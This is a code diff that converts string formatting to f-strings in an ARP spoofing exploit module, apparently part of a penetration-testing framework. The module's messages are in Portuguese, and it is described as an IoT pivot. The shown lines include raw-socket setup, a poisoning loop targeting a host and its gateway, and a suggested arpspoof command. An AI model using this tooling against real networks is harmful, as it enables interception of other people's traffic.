@@ -26,7 +26,7 @@ def _mac_str_to_bytes(mac_str):
 
 
 def _bytes_to_mac_str(mac_bytes):
-    return ":".join("{:02x}".format(b) for b in mac_bytes)
+    return ":".join(f"{b:02x}" for b in mac_bytes)
 
 
 def _build_arp_packet(op, src_mac, src_ip, dst_mac, dst_ip):
@@ -94,7 +94,7 @@ class Exploit(Exploit):
     def _get_local_mac(self, iface):
         """Obtém MAC da interface local via /sys/class/net/."""
         try:
-            with open("/sys/class/net/{}/address".format(iface)) as f:
+            with open(f"/sys/class/net/{iface}/address") as f:
                 return f.read().strip()
         except Exception:
             try:
@@ -136,29 +136,28 @@ class Exploit(Exploit):
     @multi
     def run(self):
         """Executa envenenamento ARP para pivot IoT."""
-        print_status("ARP Spoof IoT Pivot | alvo={} | gateway={}".format(
-            self.target, self.gateway_ip))
+        print_status(f"ARP Spoof IoT Pivot | alvo={self.target} | gateway={self.gateway_ip}")
 
         local_mac_str = str(self.attacker_mac) if self.attacker_mac else self._get_local_mac(str(self.interface))
         if not local_mac_str:
-            print_error("Não foi possível obter MAC local da interface {}".format(self.interface))
+            print_error(f"Não foi possível obter MAC local da interface {self.interface}")
             return
 
-        print_info("MAC do atacante: {}".format(local_mac_str))
+        print_info(f"MAC do atacante: {local_mac_str}")
 
         target_mac_str = self._get_mac_for_ip(str(self.target))
         gateway_mac_str = self._get_mac_for_ip(str(self.gateway_ip))
 
         if not target_mac_str:
-            print_warning("MAC do alvo {} não resolvido — usando broadcast".format(self.target))
+            print_warning(f"MAC do alvo {self.target} não resolvido — usando broadcast")
             target_mac_str = "ff:ff:ff:ff:ff:ff"
 
         if not gateway_mac_str:
-            print_warning("MAC do gateway {} não resolvido — usando broadcast".format(self.gateway_ip))
+            print_warning(f"MAC do gateway {self.gateway_ip} não resolvido — usando broadcast")
             gateway_mac_str = "ff:ff:ff:ff:ff:ff"
 
-        print_info("MAC alvo: {}".format(target_mac_str))
-        print_info("MAC gateway: {}".format(gateway_mac_str))
+        print_info(f"MAC alvo: {target_mac_str}")
+        print_info(f"MAC gateway: {gateway_mac_str}")
 
         attacker_mac = _mac_str_to_bytes(local_mac_str)
         target_mac = _mac_str_to_bytes(target_mac_str)
@@ -172,13 +171,12 @@ class Exploit(Exploit):
             sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(_ETHERTYPE_ARP))
             sock.bind((str(self.interface), 0))
         except (OSError, AttributeError) as exc:
-            print_error("Falha ao abrir socket raw: {} (requer root)".format(exc))
-            print_info("Alternativa: use arpspoof -i {} -t {} {} ou scapy".format(
-                self.interface, self.target, self.gateway_ip))
+            print_error(f"Falha ao abrir socket raw: {exc} (requer root)")
+            print_info(f"Alternativa: use arpspoof -i {self.interface} -t {self.target} {self.gateway_ip} ou scapy")
             return
 
-        print_warning("Iniciando envenenamento ARP por {} segundos...".format(self.duration))
-        print_warning("Redirecionando: {} <-> {}".format(self.target, self.gateway_ip))
+        print_warning(f"Iniciando envenenamento ARP por {self.duration} segundos...")
+        print_warning(f"Redirecionando: {self.target} <-> {self.gateway_ip}")
 
         stop_event = threading.Event()
         packets_sent = [0]
@@ -208,7 +206,7 @@ class Exploit(Exploit):
         stop_event.set()
         poison_thread.join(timeout=3)
 
-        print_info("Pacotes de envenenamento enviados: {}".format(packets_sent[0]))
+        print_info(f"Pacotes de envenenamento enviados: {packets_sent[0]}")
 
         if self.restore_on_exit:
             print_status("Restaurando tabelas ARP...")
